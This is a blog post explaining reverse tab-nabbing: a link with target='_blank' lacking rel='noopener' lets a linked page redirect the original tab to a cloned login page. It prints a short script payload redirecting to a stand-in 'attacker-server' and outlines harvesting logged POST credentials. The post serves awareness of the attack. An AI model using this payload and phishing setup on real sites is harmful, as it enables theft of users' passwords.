[back](/)

### Tab-nabbing attack to stealing creds

Imagine that clicking on the received link from a trusted user is normal =)

Despite all the irony, this behavior is quite typical for ordinary users who do not think about how safe the code of web applications that are open in their browser, in numerous tabs, is written.
This is about **Tab-nabbing** attack. The essence of which is to open a new tab in the victim's browser, the link to which is indicated with html tag **target="_blank"** attribute, but without **rel="noopener nofollow"** tag.

```
<a href="https://anylink.com target="_blank"> GoToAnyLink </a>
```

In this case **something.html** page is opened in the victim's browser with the code:

```
<html>
<script>
if (window.opener) window.opener.parent.location.replace ('http://attacker-server/index.html');
if (window.parent! = window) window.parent.location.replace ('http://attacker-server/index.html');
</script>

Hi dude =)<br>
Check my notes

</html>
```

![Image](/img/tabnabbing/1.png)

Any vulnerable navigation to a new tab in the browser where the code is delimited by the tag **target ="_blank"** will be redirected to the page **http://attacker-server/index.html**.

![Image](/img/tabnabbing/2.png)

At the same time, the attacker can clone the authorization page to the vulnerable page using «httrack» or any similar utility. In this case, unnoticed by the victim, a transition will be made to the tab with the vulnerable site. As a rule, in such cases, the victim enters his username and password, assuming that the timed out session has expired. As a result, the attacker can easily obtain the victim's login and password using a web server with the ability to log POST requests.

![Image](/img/tabnabbing/3.png)

Thus, the attacker receives a username and password from the victim with a minimum set of tools and labor costs. In total for the attack you need: a web server with the ability to log POST requests, a phishing web page for authorization and a payload in the form of an html file

![Image](/img/tabnabbing/4.png)

That's all friends, watch the tabs in the browser and the links you click on =)

Links:
+ [https://hackerone.com](https://hackerone.com/reports/179568)
+ [How to dump post request with python](https://georgik.rocks/how-to-dump-post-request-with-python)


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)